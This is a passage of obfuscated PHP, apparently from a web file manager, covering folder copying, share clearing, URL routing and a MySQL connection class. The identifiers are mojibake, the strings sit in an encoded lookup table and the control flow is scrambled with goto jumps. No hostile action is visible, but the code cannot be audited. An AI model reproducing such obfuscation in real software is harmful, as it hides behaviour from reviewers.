$FêÈﬂ†Í¢π[$bõ¿ö¡”≈¶[393]], $bõ¿ö¡”≈¶[394] => $FêÈﬂ†Í¢π[$bõ¿ö¡”≈¶[395]], $bõ¿ö¡”≈¶[397] => USER_ID, $bõ¿ö¡”≈¶[400] => 0, $bõ¿ö¡”≈¶[387] => $D‡—ßÚŸÀº); $CéÏó°Ìí£ = $E¯Ù¯“à´∏[$bõ¿ö¡”≈¶[393]] == SourceModel::TYPE_GROUP && $FêÈﬂ†Í¢π[$bõ¿ö¡”≈¶[393]] == SourceModel::TYPE_GROUP && $E¯Ù¯“à´∏[$bõ¿ö¡”≈¶[395]] == $FêÈﬂ†Í¢π[$bõ¿ö¡”≈¶[395]]; goto FÊÕÁ≠Ÿæ≠; FÊÕÁ≠Ÿæ≠: if (!$CéÏó°Ìí£) { Model($bõ¿ö¡”≈¶[412])->authClear($Fµ ∆∆«œ¿); } if ($EãïµçÜÉã) { $cèÑ’‚≈∂ƒ = array($bõ¿ö¡”≈¶[399] => array($bõ¿ö¡”≈¶[408], $E¯Ù¯“à´∏[$bõ¿ö¡”≈¶[373]] . $E¯Ù¯“à´∏[$bõ¿ö¡”≈¶[374]] . $bõ¿ö¡”≈¶[409])); $cË§ö≥∞–∞ = $E¯Ù¯“à´∏[$bõ¿ö¡”≈¶[373]] . $E¯Ù¯“à´∏[$bõ¿ö¡”≈¶[374]] . $bõ¿ö¡”≈¶[47]; $CÿÀêΩÓÖ∏ = $FêÈﬂ†Í¢π[$bõ¿ö¡”≈¶[373]] . $FêÈﬂ†Í¢π[$bõ¿ö¡”≈¶[374]] . $bõ¿ö¡”≈¶[47] . $E¯Ù¯“à´∏[$bõ¿ö¡”≈¶[374]] . $bõ¿ö¡”≈¶[47]; $a›ÖòπÆ∂‘ = array($bõ¿ö¡”≈¶[399] => array($bõ¿ö¡”≈¶[413], "\162\x65\x70\x6c\x61\x63\145\x28\160\x61\162\x65\156\x74\114\x65\166\x65\154\x2c\x27{$cË§ö≥∞–∞}\x27\x2c\47{$CÿÀêΩÓÖ∏}\47\x29"), $bõ¿ö¡”≈¶[392] => $FêÈﬂ†Í¢π[$bõ¿ö¡”≈¶[393]], $bõ¿ö¡”≈¶[394] => $FêÈﬂ†Í¢π[$bõ¿ö¡”≈¶[395]], $bõ¿ö¡”≈¶[400] => 0); $this->where($cèÑ’‚≈∂ƒ)->data($a›ÖòπÆ∂‘)->save(); } $this->where(array($bõ¿ö¡”≈¶[414] => $Fµ ∆∆«œ¿))->data($B©úîËø≠ﬂ)->save(); goto dﬂÈ—„¡Ù”; B—Î—Õ¯èÑ: $bõ¿ö¡”≈¶ =& $_SERVER[∞„˜ƒÑºª]; $E¯Ù¯“à´∏ = $this->sourceInfo($Fµ ∆∆«œ¿); $FêÈﬂ†Í¢π = $this->sourceInfo($aˆõ´¿Ò◊Ã); goto fÉÁﬂ∞îòä; dﬂÈ—„¡Ù”: return $Fµ ∆∆«œ¿; goto A≠¡ò¥Ò–Ç; A≠¡ò¥Ò–Ç: } private function clearShare($d÷€Çª≥ÚŒ, $eºí‘ÎÊ∑ê) { goto Cî“èÈµµÔ; F⁄™˘„∆Ü…: Model($FÌ≠í…ﬁ“í[417])->where($Cπ÷úﬂüÆº)->save(array($FÌ≠í…ﬁ“í[416] => 0)); Model($FÌ≠í…ﬁ“í[419])->where($Cπ÷úﬂüÆº)->delete(); goto DêÛﬁóÊ≈·; FèÑÀ◊€ØÒ: if (!$A·°Ò“–•π) { return; } $A·°Ò“–•π = array_to_keyvalue($A·°Ò“–•π, $FÌ≠í…ﬁ“í[33], $FÌ≠í…ﬁ“í[418]); $Cπ÷úﬂüÆº = array($FÌ≠í…ﬁ“í[418] => array($FÌ≠í…ﬁ“í[7], $A·°Ò“–•π)); goto F⁄™˘„∆Ü…; d¬≤ﬁÑ◊∞®: if (!$b§ºç¶πäπ) { return; } $Cπ÷úﬂüÆº = array($FÌ≠í…ﬁ“í[374] => array($FÌ≠í…ﬁ“í[7], $b§ºç¶πäπ), $FÌ≠í…ﬁ“í[416] => 1); $A·°Ò“–•π = Model($FÌ≠í…ﬁ“í[417])->field($FÌ≠í…ﬁ“í[418])->where($Cπ÷úﬂüÆº)->select(); goto FèÑÀ◊€ØÒ; Cî“èÈµµÔ: $FÌ≠í…ﬁ“í =& $_SERVER[∞„˜ƒÑºª]; $eÍÛõ™çäΩ = $this->sourceInfo($d÷€Çª≥ÚŒ); $Dè˘¶≈ÏÕ“ = $this->sourceInfo($eºí‘ÎÊ∑ê); goto BÀÒ©ˆƒî; BÀÒ©ˆƒî: if ($eÍÛõ™çäΩ[$FÌ≠í…ﬁ“í[395]] == $Dè˘¶≈ÏÕ“[$FÌ≠í…ﬁ“í[395]] && $eÍÛõ™çäΩ[$FÌ≠í…ﬁ“í[393]] == $FÌ≠í…ﬁ“í[415]) { return; } $Cπ÷úﬂüÆº = array($FÌ≠í…ﬁ“í[373] => array($FÌ≠í…ﬁ“í[408], $eÍÛõ™çäΩ[$FÌ≠í…ﬁ“í[373]] . $d÷€Çª≥ÚŒ . $FÌ≠í…ﬁ“í[409]), $FÌ≠í…ﬁ“í[410] => 0); $b§ºç¶πäπ = $this->field($FÌ≠í…ﬁ“í[414])->where($Cπ÷úﬂüÆº)->getField($FÌ≠í…ﬁ“í[374], !0); goto d¬≤ﬁÑ◊∞®; DêÛﬁóÊ≈·: } public function copyFolderFromIO($aÁÂπãÔè˜, $D¨Î°¬—ê, $DÁåªÔ∂¡ÿ, $AæﬁéÂ€†–, $b¢¶¨ñÈ†ù) { goto B≈…Âƒ¨Ô◊; CÒèı‰Ñâº: Hook::trigger($EÃí´ûãˆƒ[422]); if ($aå⁄Ω“≠íÃ) { $this->folderSizeResetChildren($aå⁄Ω“≠íÃ); } $this->_childrenListClear(); goto aÃú±ùï⁄æ; CÛ‡«˜«ºé: if ($F–è…ÖÜãõ) { $this->_childrenAllMake($F–è…ÖÜãõ); } Hook::trigger($EÃí´ûãˆƒ[421]); $this->_copyChildTo($aÁÂπãÔè˜, $D¨Î°¬—ê, $aå⁄Ω“≠íÃ, $AæﬁéÂ€†–, $EÒÎﬂ›—∂´, $b¢¶¨ñÈ†ù); goto CÒèı‰Ñâº; B≈…Âƒ¨Ô◊: $EÃí´ûãˆƒ =& $_SERVER[∞„˜ƒÑºª]; $EÒÎﬂ›—∂´ = array($EÃí´ûãˆƒ[378] => array(), $EÃí´ûãˆƒ[379] => array(), $EÃí´ûãˆƒ[377] => array(), $EÃí´ûãˆƒ[420] => array()); $Eà∫Á÷Û≠∫ = $aÁÂπãÔè˜->getPathName($aÁÂπãÔè˜->pathThis($D¨Î°¬—ê)); goto F·Ôô…ëÑæ; cààßÁõÑ»: $this->updateModifyTime($DÁåªÔ∂¡ÿ); return $aå⁄Ω“≠íÃ; goto E£⁄ëŸáç‰; F·Ôô…ëÑæ: $F–è…ÖÜãõ = $this->fileNameExist($DÁåªÔ∂¡ÿ, $Eà∫Á÷Û≠∫); $aå⁄Ω“≠íÃ = $this->mkdir($DÁåªÔ∂¡ÿ, $Eà∫Á÷Û≠∫, $AæﬁéÂ€†–); if (!$F–è…ÖÜãõ || $AæﬁéÂ€†– == REPEAT_RENAME_FOLDER) { $AæﬁéÂ€†– = !1; } goto CÛ‡«˜«ºé; dçﬁ⁄√öÒî: Model($EÃí´ûãˆƒ[163])->linkAdd($EÒÎﬂ›—∂´[$EÃí´ûãˆƒ[377]]); Model($EÃí´ûãˆƒ[163])->remove($EÒÎﬂ›—∂´[$EÃí´ûãˆƒ[420]]); $this->folderSizeReset($DÁåªÔ∂¡ÿ); goto cààßÁõÑ»; aÃú±ùï⁄æ: Model($EÃí´ûãˆƒ[380])->addAll($EÒÎﬂ›—∂´[$EÃí´ûãˆƒ[378]], array(), !0); Model($EÃí´ûãˆƒ[381])->eventCopy($aå⁄Ω“≠íÃ); $this->saveAll($EÒÎﬂ›—∂´[$EÃí´ûãˆƒ[379]]); goto dçﬁ⁄√öÒî; E£⁄ëŸáç‰: } private function _copyChildTo($f›π™õŸÜß, $dé€∞∏Â¢ë, $B≤ã√÷•„˘, $F˘Ë„“‚∞é, &$D≈Ôáå‡‡ñ, $Aî¶Ó¢‹ë—) { goto DäßÁ⁄”µê; DäßÁ⁄”µê: $a‡°Ñ®éÈï =& $_SERVER[∞„˜ƒÑºª]; $béÖôùÖô° = $this->sourceInfoCache($B≤ã√÷•„˘); $aô‘•∆úÌä = $f›π™õŸÜß->listPath($dé€∞∏Â¢ë, !1, !0); goto F…ª¡ùÜÆ≠; F…ª¡ùÜÆ≠: $D…¿¬‘Æ Û = array_merge($aô‘•∆úÌä[$a‡°Ñ®éÈï[82]], $aô‘•∆úÌä[$a‡°Ñ®éÈï[83]]); $aˆ≥—ØÎ˜Ç = $this->_addFiles($f›π™õŸÜß, $aô‘•∆úÌä[$a‡°Ñ®éÈï[82]], $Aî¶Ó¢‹ë—); $AÓ±∑˜ìÈ‡ = array(); goto E›∞åõäﬁÿ; FÙ•ß‚íÕ : $Cä‰Ñ≥≤÷© = $this->_childrenList($B≤ã√÷•„˘); $Cä‰Ñ≥≤÷© = array_to_keyvalue($Cä‰Ñ≥≤÷©, $a‡°Ñ®éÈï[28]); foreach ($D…¿¬‘Æ Û as $få‚„Ü®éπ) { $E®∫µ˜‡¯– = $Cä‰Ñ≥≤÷©[$få‚„Ü®éπ[$a‡°Ñ®éÈï[28]]]; $f†èãÜµíó = $E®∫µ˜‡¯–[$a‡°Ñ®éÈï[374]]; $this->_copyApplyMeta($E®∫µ˜‡¯–, $D≈Ôáå‡‡ñ); if ($få‚„Ü®éπ[$a‡°Ñ®éÈï[29]] == $a‡°Ñ®éÈï[85]) { $få‚„Ü®éπ[$a‡°Ñ®éÈï[84]] = $f›π™õŸÜß->getPathInner($få‚„Ü®éπ[$a‡°Ñ®éÈï[84]]); $this->_copyChildTo($f›π™õŸÜß, $få‚„Ü®éπ[$a‡°Ñ®éÈï[84]], $f†èãÜµíó, $F˘Ë„“‚∞é, $D≈Ôáå‡‡ñ, $Aî¶Ó¢‹ë—); } } goto CÜ—·◊çƒü; E›∞åõäﬁÿ: foreach ($D…¿¬‘Æ Û as &$få‚„Ü®éπ) { goto CÃ“õáŸàÍ; aªã˜ü´√ô: if ($F˘Ë„“‚∞é) { $FÍÌ¬óÎà— = $this->fileNameExistCache($B≤ã√÷•„˘, $få‚„Ü®éπ[$a‡°Ñ®éÈï[28]]); if ($FÍÌ¬óÎà—) { if ($få‚„Ü®éπ[$a‡°Ñ®éÈï[375]] || $F˘Ë„“‚∞é == REPEAT_SKIP) { continue; } if ($F˘Ë„“‚∞é == REPEAT_REPLACE) { $E®∫µ˜‡¯– = $this->sourceInfoCache($FÍÌ¬óÎà—); $c≈‡ÖÈµì = $this->fileHistory($E®∫µ˜‡¯–, $få‚„Ü®éπ[$a‡°Ñ®éÈï[382]], $få‚„Ü®éπ[$a‡°Ñ®éÈï[86]]); if ($c≈‡ÖÈµì) { $D≈Ôáå‡‡ñ[$a‡°Ñ®éÈï[377]][] = $få‚„Ü®éπ[$a‡°Ñ®éÈï[382]]; } continue; } else { if ($F˘Ë„“‚∞é == REPEAT_RENAME) { $få‚„Ü®éπ[$a‡°Ñ®éÈï[28]] = $this->fileNameAutoCache($B≤ã√÷•„˘, $få‚„Ü®éπ[$a‡°Ñ®éÈï[28]], $F˘Ë„“‚∞é, !1); } } } } if (!$få‚„Ü®éπ[$a‡°Ñ®éÈï[375]] && $få‚„Ü®éπ[$a‡°Ñ®éÈï[382]]) { $D≈Ôáå‡‡ñ[$a‡°Ñ®éÈï[377]][] = $få‚„Ü®éπ[$a‡°Ñ®éÈï[382]]; } $AÓ±∑˜ìÈ‡[] = $this->_makeItemData($få‚„Ü®éπ, $béÖôùÖô°, $få‚„Ü®éπ[$a‡°Ñ®éÈï[28]]); goto EµéÇπ¯ê€; CÃ“õáŸàÍ: if (isset($aˆ≥—ØÎ˜Ç[$få‚„Ü®éπ[$a‡°Ñ®éÈï[28]]])) { $få‚„Ü®éπ = $aˆ≥—ØÎ˜Ç[$få‚„Ü®éπ[$a‡°Ñ®éÈï[28]]]; } $få‚„Ü®éπ[$a‡°Ñ®éÈï[375]] = $få‚„Ü®éπ[$a‡°Ñ®éÈï[29]] == $a‡°Ñ®éÈï[85]; $få‚„Ü®éπ[$a‡°Ñ®éÈï[389]] = _get($få‚„Ü®éπ, $a‡°Ñ®éÈï[156], $a‡°Ñ®éÈï[33]); goto a•“ﬂÇâ∑å; a•“ﬂÇâ∑å: $få‚„Ü®éπ[$a‡°Ñ®éÈï[86]] = _get($få‚„Ü®éπ, $a‡°Ñ®éÈï[86], 0); $få‚„Ü®éπ[$a‡°Ñ®éÈï[382]] = _get($få‚„Ü®éπ, $a‡°Ñ®éÈï[382], 0); if (!isset($få‚„Ü®éπ[$a‡°Ñ®éÈï[423]]) && $få‚„Ü®éπ[$a‡°Ñ®éÈï[382]]) { $D≈Ôáå‡‡ñ[$a‡°Ñ®éÈï[420]][] = $få‚„Ü®éπ[$a‡°Ñ®éÈï[382]]; } goto aªã˜ü´√ô; EµéÇπ¯ê€: } unset($få‚„Ü®éπ); if (!empty($AÓ±∑˜ìÈ‡)) { $this->addAll($AÓ±∑˜ìÈ‡); } goto FÙ•ß‚íÕ ; CÜ—·◊çƒü: } private function _addFiles($cÁÌÌÆ»íú, $câ≥±åãÈå, $F™ı—Üï•®) { goto dã∫ò≤‡Ë±; dã∫ò≤‡Ë±: $e∫ãü»Ôµè =& $_SERVER[∞„˜ƒÑºª]; if (!$câ≥±åãÈå || count($câ≥±åãÈå) == 0) { return array(); } $d°—ŒÀÏÓË = array(); goto AË‹„ﬂÑÑÔ; dÃú©ûæ≈´: $F—›˜ÁñÇÔ = array(); foreach ($câ≥±åãÈå as $aË—‰≈Ü¬Ú) { if (isset($aË—‰≈Ü¬Ú[$e∫ãü»Ôµè[423]]) && $aË—‰≈Ü¬Ú[$e∫ãü»Ôµè[423]]) { continue; } $dîµÑ†ùÓí = $cÁÌÌÆ»íú->getPathInner($aË—‰≈Ü¬Ú[$e∫ãü»Ôµè[84]]); $cÒïÚ§Ò∞è = $Bò˜òãÓ¬€->addFileMake($dîµÑ†ùÓí, $aË—‰≈Ü¬Ú[$e∫ãü»Ôµè[86]], $aË—‰≈Ü¬Ú[$e∫ãü»Ôµè[160]], $aË—‰≈Ü¬Ú[$e∫ãü»Ôµè[159]], $aË—‰≈Ü¬Ú[$e∫ãü»Ôµè[28]], $F™ı—Üï•®); $F—›˜ÁñÇÔ[] = $cÒïÚ§Ò∞è; } $Bò˜òãÓ¬€->addAll($F—›˜ÁñÇÔ); goto dôØŸÍõñò; DÛÿÃíÖ„ç: foreach ($dê†ûºˆÏ£ as $d≥æµ—äìî) { if (!isset($d°—ŒÀÏÓË[$d≥æµ—äìî[$e∫ãü»Ôµè[159]]])) { continue; } $A∏„ñıå–¶ =& $d°—ŒÀÏÓË[$d≥æµ—äìî[$e∫ãü»Ôµè[159]]]; foreach ($A∏„ñıå–¶ as &$e»ç‚•ºæ∫) { $e»ç‚•ºæ∫[$e∫ãü»Ôµè[382]] = $d≥æµ—äìî[$e∫ãü»Ôµè[382]]; } unset($e»ç‚•ºæ∫); } $Cñ∑⁄ÉÖÒ¶ = array(); foreach ($câ≥±åãÈå as $aÿïÑ‰ÍÀÀ) { $Cñ∑⁄ÉÖÒ¶[$aÿïÑ‰ÍÀÀ[$e∫ãü»Ôµè[28]]] = $aÿïÑ‰ÍÀÀ; } goto E≥ÿÖŒèà€; E≥ÿÖŒèà€: return $Cñ∑⁄ÉÖÒ¶; goto C›ˆùÂ”´ä; dôØŸÍõñò: $b°‹Õ•÷ä´ = array($e∫ãü»Ôµè[159] => array($e∫ãü»Ôµè[7], array_keys($d°—ŒÀÏÓË))); $dê†ûºˆÏ£ = $Bò˜òãÓ¬€->where($b°‹Õ•÷ä´)->select(); $dê†ûºˆÏ£ = $dê†ûºˆÏ£ ? $dê†ûºˆÏ£ : array(); goto DÛÿÃíÖ„ç; A≤»ãºì…ç: $dê†ûºˆÏ£ = $Bò˜òãÓ¬€->where($b°‹Õ•÷ä´)->select(); $dê†ûºˆÏ£ = $dê†ûºˆÏ£ ? $dê†ûºˆÏ£ : array(); foreach ($dê†ûºˆÏ£ as $d≥æµ—äìî) { if (!isset($d°—ŒÀÏÓË[$d≥æµ—äìî[$e∫ãü»Ôµè[159]]])) { continue; } $f»ì ãŸ©≤ = $d°—ŒÀÏÓË[$d≥æµ—äìî[$e∫ãü»Ôµè[159]]]; foreach ($f»ì ãŸ©≤ as &$e»ç‚•ºæ∫) { $e»ç‚•ºæ∫[$e∫ãü»Ôµè[382]] = $d≥æµ—äìî[$e∫ãü»Ôµè[382]]; $e»ç‚•ºæ∫[$e∫ãü»Ôµè[423]] = !0; } unset($e»ç‚•ºæ∫); } goto dÃú©ûæ≈´; AË‹„ﬂÑÑÔ: foreach ($câ≥±åãÈå as &$e»ç‚•ºæ∫) { goto d÷≠öçÍ÷à; d÷≠öçÍ÷à: Hook::trigger($e∫ãü»Ôµè[424], $e»ç‚•ºæ∫); $e»ç‚•ºæ∫[$e∫ãü»Ôµè[84]] = $cÁÌÌÆ»íú->getPathInner($e»ç‚•ºæ∫[$e∫ãü»Ôµè[84]]); $AäéªÇÍ…£ = $cÁÌÌÆ»íú->hashSimple($e»ç‚•ºæ∫[$e∫ãü»Ôµè[84]]); goto a∞Ø‡∞çòè; FèÇÂ‚›∫†: $e»ç‚•ºæ∫[$e∫ãü»Ôµè[159]] = $e“òÛöûÖß; Hook::trigger($e∫ãü»Ôµè[425], $e»ç‚•ºæ∫); $d°—ŒÀÏÓË[$e“òÛöûÖß][] =& $e»ç‚•ºæ∫; goto a≤∫„Ü∂ß´; a≤∫„Ü∂ß´: if (count($d°—ŒÀÏÓË[$e“òÛöûÖß]) > 1) { $e»ç‚•ºæ∫[$e∫ãü»Ôµè[423]] = !0; } goto fÓØóèØ÷ı; a∞Ø‡∞çòè: $e“òÛöûÖß = $cÁÌÌÆ»íú->hashMd5($e»ç‚•ºæ∫[$e∫ãü»Ôµè[84]]); if (strlen($e“òÛöûÖß) > 10 && !isset($d°—ŒÀÏÓË[$e“òÛöûÖß])) { $d°—ŒÀÏÓË[$e“òÛöûÖß] = array(); } $e»ç‚•ºæ∫[$e∫ãü»Ôµè[160]] = $AäéªÇÍ…£; goto FèÇÂ‚›∫†; fÓØóèØ÷ı: } $b°‹Õ•÷ä´ = array($e∫ãü»Ôµè[159] => array($e∫ãü»Ôµè[7], array_keys($d°—ŒÀÏÓË))); $Bò˜òãÓ¬€ = Model($e∫ãü»Ôµè[426]); goto A≤»ãºì…ç; C›ˆùÂ”´ä: } } class Application { private $defaultModule = "\151\156\x64\x65\170"; private $defaultController = "\151\156\x64\x65\x78"; private $defaultAction = "\x69\x6e\x64\145\x78"; public function setDefault($CæÓ√Ç¿¶≤) { $a™‰ÜÒâå÷ =& $_SERVER[∞„˜ƒÑºª]; $c’¯ºü∂¥« = explode($a™‰ÜÒâå÷[98], trim($CæÓ√Ç¿¶≤, $a™‰ÜÒâå÷[98])); $this->defaultModule = $c’¯ºü∂¥«[0] ? $c’¯ºü∂¥«[0] : $this->defaultModule; $this->defaultController = $c’¯ºü∂¥«[1] ? $c’¯ºü∂¥«[1] : $this->defaultController; $this->defaultAction = $c’¯ºü∂¥«[2] ? $c’¯ºü∂¥«[2] : $this->defaultAction; } public function appRun($b±ã¨¬∏œ·) { goto Cîœñ≈é™Ã; a£ëµ∏çÑÛ: ActionCall($b±ã¨¬∏œ·); Hook::trigger($e∆€€√ÇÑÿ . $eÛ»ëå´¥«[432], $b±ã¨¬∏œ·); goto FäÇïß⁄¨Î; e¥∞áÚ›áü: $e∆€€√ÇÑÿ = $eÛ»ëå´¥«[427]; if ($f‡ÿÆ„õŸÔ == $eÛ»ëå´¥«[428]) { $e∆€€√ÇÑÿ = $eÛ»ëå´¥«[429]; $Dì·óòƒëÈ[0] = $eÛ»ëå´¥«[33]; $Dì·óòƒëÈ[1] = $Dì·óòƒëÈ[1] . $eÛ»ëå´¥«[430]; $b±ã¨¬∏œ· = join($eÛ»ëå´¥«[98], $Dì·óòƒëÈ); $b±ã¨¬∏œ· = trim($b±ã¨¬∏œ·, $eÛ»ëå´¥«[98]); } Hook::trigger($e∆€€√ÇÑÿ . $eÛ»ëå´¥«[431], $b±ã¨¬∏œ·); goto a£ëµ∏çÑÛ; Cîœñ≈é™Ã: $eÛ»ëå´¥« =& $_SERVER[∞„˜ƒÑºª]; $Dì·óòƒëÈ = explode($eÛ»ëå´¥«[98], $b±ã¨¬∏œ·); $f‡ÿÆ„õŸÔ = strtolower($Dì·óòƒëÈ[0]); goto e¥∞áÚ›áü; FäÇïß⁄¨Î: } private function autorun() { $eä’•Éñãè =& $_SERVER[∞„˜ƒÑºª]; global $config; if (count($config[$eä’•Éñãè[433]]) == 0) { return; } foreach ($config[$eä’•Éñãè[433]] as $a‘ÉãÜ√®ó => $açºÒ≥Ççî) { $this->appRun($açºÒ≥Ççî); } } private function parsePluginRoute() { goto b¬Ò·åÜÍÑ; b¬Ò·åÜÍÑ: $Cäù÷ß›∂ù =& $_SERVER[∞„˜ƒÑºª]; $Aﬁ£Ã∞†›â = $Cäù÷ß›∂ù[428]; $b”ﬁ¥·èÎÇ = $GLOBALS[$Cäù÷ß›∂ù[7]][$Cäù÷ß›∂ù[434]][0]; goto e˜¡°øõ‹ò; fÏÇ¥àﬂú◊: $cáÇ˘ŒÚæ„ = array($Cäù÷ß›∂ù[428], $aô’á∑…Á’); $cûº¯Î°µ≈ = array_slice($GLOBALS[$Cäù÷ß›∂ù[7]][$Cäù÷ß›∂ù[434]], 1); $GLOBALS[$Cäù÷ß›∂ù[7]][$Cäù÷ß›∂ù[434]] = array_merge($cáÇ˘ŒÚæ„, $cûº¯Î°µ≈); goto f´â”ëêÀŒ; f´â”ëêÀŒ: $GLOBALS[$Cäù÷ß›∂ù[7]][$Cäù÷ß›∂ù[435]] = implode($Cäù÷ß›∂ù[98], $GLOBALS[$Cäù÷ß›∂ù[7]][$Cäù÷ß›∂ù[434]]); goto aÒè‹ú∞ıΩ; e˜¡°øõ‹ò: if (!$b”ﬁ¥·èÎÇ || strlen($b”ﬁ¥·èÎÇ) <= strlen($Aﬁ£Ã∞†›â)) { return; } if (strtolower(substr($b”ﬁ¥·èÎÇ, -strlen($Aﬁ£Ã∞†›â))) != $Aﬁ£Ã∞†›â) { return; } $aô’á∑…Á’ = substr($b”ﬁ¥·èÎÇ, 0, -strlen($Aﬁ£Ã∞†›â)); goto fÏÇ¥àﬂú◊; aÒè‹ú∞ıΩ: } private function parseUriRoute() { goto FÖ∂´Á∫ÚÛ; FÖ∂´Á∫ÚÛ: $EõΩ∑ëÎﬂ˜ =& $_SERVER[∞„˜ƒÑºª]; if ($GLOBALS[$EõΩ∑ëÎﬂ˜[7]][$EõΩ∑ëÎﬂ˜[435]] != $EõΩ∑ëÎﬂ˜[33]) { return; } $E¯ çÿŒ˜¬ = $_SERVER[$EõΩ∑ëÎﬂ˜[436]]; goto C‡èÇú¢úë; CæÌ§õˆ”µ: $E§ÂÆ¯è™à = substr($E¯ çÿŒ˜¬, $A“·ıΩ±éú + strlen($C„‘—È‰÷…)); preg_match_all($EõΩ∑ëÎﬂ˜[438], $E§ÂÆ¯è™à, $C´ØÇÿ—∂ú); $E§ÂÆ¯è™à = trim($C´ØÇÿ—∂ú[0][0], $EõΩ∑ëÎﬂ˜[8]); goto aÚã∫ûŸâÖ; C‡èÇú¢úë: $C„‘—È‰÷… = $EõΩ∑ëÎﬂ˜[437]; if (!strstr($E¯ çÿŒ˜¬, $C„‘—È‰÷…)) { return; } $A“·ıΩ±éú = strrpos($E¯ çÿŒ˜¬, $C„‘—È‰÷…); goto CæÌ§õˆ”µ; aÚã∫ûŸâÖ: $GLOBALS[$EõΩ∑ëÎﬂ˜[7]][$EõΩ∑ëÎﬂ˜[434]] = explode($EõΩ∑ëÎﬂ˜[8], $E§ÂÆ¯è™à); $GLOBALS[$EõΩ∑ëÎﬂ˜[7]][$EõΩ∑ëÎﬂ˜[435]] = implode($EõΩ∑ëÎﬂ˜[98], $GLOBALS[$EõΩ∑ëÎﬂ˜[7]][$EõΩ∑ëÎﬂ˜[434]]); goto aÁâ≤°Ûè≥; aÁâ≤°Ûè≥: } public function run() { goto c€àŸ—˘Üé; E…ºå∫ã◊è: define($cà››àÎÉÜ[440], $añ‰ù â≤≥[1] ? $añ‰ù â≤≥[1] : $this->defaultController); define($cà››àÎÉÜ[441], $añ‰ù â≤≥[2] ? $añ‰ù â≤≥[2] : $this->defaultAction); define($cà››àÎÉÜ[442], MOD . $cà››àÎÉÜ[98] . ST . $cà››àÎÉÜ[98] . ACT); goto AŒ∞íµ˜•£; c€àŸ—˘Üé: $cà››àÎÉÜ =& $_SERVER[∞„˜ƒÑºª]; $this->parseUriRoute(); $this->parsePluginRoute(); goto aØ†Û‘Ñ≥Ñ; AŒ∞íµ˜•£: $this->autorun(); if (count($añ‰ù â≤≥) >= 3) { $this->appRun($d„”Ú≈∏é¥); } else { $this->appRun(ACTION); } goto F±êªÔƒ˘Ñ; aØ†Û‘Ñ≥Ñ: $añ‰ù â≤≥ = $GLOBALS[$cà››àÎÉÜ[7]][$cà››àÎÉÜ[434]]; $d„”Ú≈∏é¥ = $GLOBALS[$cà››àÎÉÜ[7]][$cà››àÎÉÜ[435]]; define($cà››àÎÉÜ[439], $añ‰ù â≤≥[0] ? $añ‰ù â≤≥[0] : $this->defaultModule); goto E…ºå∫ã◊è; F±êªÔƒ˘Ñ: } } goto D—”˜‡«´„; a˜Öﬁµ‡äÏ: class DbMysql extends Db { public function __construct($EÛ‚»ç∏Âı = '') { $c¢ÊΩí≥é≠ =& $_SERVER[∞„˜ƒÑºª]; if (!extension_loaded($c¢ÊΩí≥é≠[472])) { think_exception(think_lang($c¢ÊΩí≥é≠[10]) . $c¢ÊΩí≥é≠[557]); } if (!empty($EÛ‚»ç∏Âı)) { $this->config = $EÛ‚»ç∏Âı; if (empty($this->config[$c¢ÊΩí≥é≠[13]])) { $this->config[$c¢ÊΩí≥é≠[13]] = $c¢ÊΩí≥é≠[33]; } } } public function connect($Fù—≥ù›ÈÌ = '', $DÏΩ¯™àèŸ = 0, $A∂¢º“‹íÕ = false) { $A≈Œˆîﬂÿ» =& $_SERVER[∞„˜ƒÑºª]; if (!isset($this->linkID[$DÏΩ¯™àèŸ])) { goto e∑∆†õŒ Ü; D˜≤µÑí¶ú: mysql_query($A≈Œˆîﬂÿ»[562] . think_config($A≈Œˆîﬂÿ»[563]) . $A≈Œˆîﬂÿ»[63], $this->linkID[$DÏΩ¯™àèŸ]); if ($c≥ﬁÉ©Ç∑ò > $A≈Œˆîﬂÿ»[564]) { mysql_query($A≈Œˆîﬂÿ»[565], $this->linkID[$DÏΩ¯™àèŸ]); } $this->connected = !0; goto dÍî‚ëµá†; dÍî‚ëµá†: if (1 != think_config($A≈Œˆîﬂÿ»[18])) { unset($this->config); } goto CÂ⁄Ìì¿îÀ; CÏ≥ñ¶ºåÇ: if ($E∂®ÂÂÃÆã) { $this->linkID[$DÏΩ¯™àèŸ] = mysql_pconnect($AÇ«âúÑ¡ì, $Fù—≥ù›ÈÌ[$A≈Œˆîﬂÿ»[560]], $Fù—≥ù›ÈÌ[$A≈Œˆîﬂÿ»[561]], 131072); } else { $this->linkID[$DÏΩ¯™àèŸ] = mysql_connect($AÇ«âúÑ¡ì, $Fù—≥ù›ÈÌ[$A≈Œˆîﬂÿ»[560]], $Fù—≥ù›ÈÌ[$A≈Œˆîﬂÿ»[561]], !0, 131072); } if (!$this->linkID[$DÏΩ¯™àèŸ] || !empty($Fù—≥ù›ÈÌ[$A≈Œˆîﬂÿ»[17]]) && !mysql_select_db($Fù—≥ù›ÈÌ[$A≈Œˆîﬂÿ»[17]], $this->linkID[$DÏΩ¯™àèŸ])) { think_exception(mysql_error()); } $c≥ﬁÉ©Ç∑ò = mysql_get_server_info($this->linkID[$DÏΩ¯™àèŸ]); goto D˜≤µÑí¶ú; e∑∆†õŒ Ü: if (empty($Fù—≥ù›ÈÌ)) { $Fù—≥ù›ÈÌ = $this->config; } $AÇ«âúÑ¡ì = $Fù—≥ù›ÈÌ[$A≈Œˆîﬂÿ»[558]] . ($Fù—≥ù›ÈÌ[$A≈Œˆîﬂÿ»[559]] ? "\x3a{$Fù—≥ù›ÈÌ[$A≈Œˆîﬂÿ»[559]]}" : $A≈Œˆîﬂÿ»[33]); $E∂®ÂÂÃÆã = !empty($Fù—≥ù›ÈÌ[$A≈Œˆîﬂÿ»[13]][$A≈Œˆîﬂÿ»[14]]) ? $Fù—≥ù›ÈÌ[$A≈Œˆîﬂÿ»[13]][$A≈Œˆîﬂÿ»[14]] : $this->pconnect; goto CÏ≥ñ¶ºåÇ; CÂ⁄Ìì¿îÀ: } return $this->linkID[$DÏΩ¯™àèŸ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($cíÊ‹¬ìˆÚ) { goto AÓπÍ∞âèˆ; b√Æñ¥ã⁄‚: if (!$this->_linkID) { return !1; } $this->queryStr = $cíÊ‹¬ìˆÚ; if ($this->queryID) { $this->free(); } goto b√ü≤ÿ”úê; AÓπÍ∞âèˆ: $cÁ˜ÛË∑ß‚ =& $_SERVER[∞„˜ƒÑºª]; if (0 === stripos($cíÊ‹¬ìˆÚ, $cÁ˜ÛË∑ß‚[251])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto b√Æñ¥ã⁄‚; b√ü≤ÿ”úê: think_action_status($cÁ˜ÛË∑ß‚[19], 1); 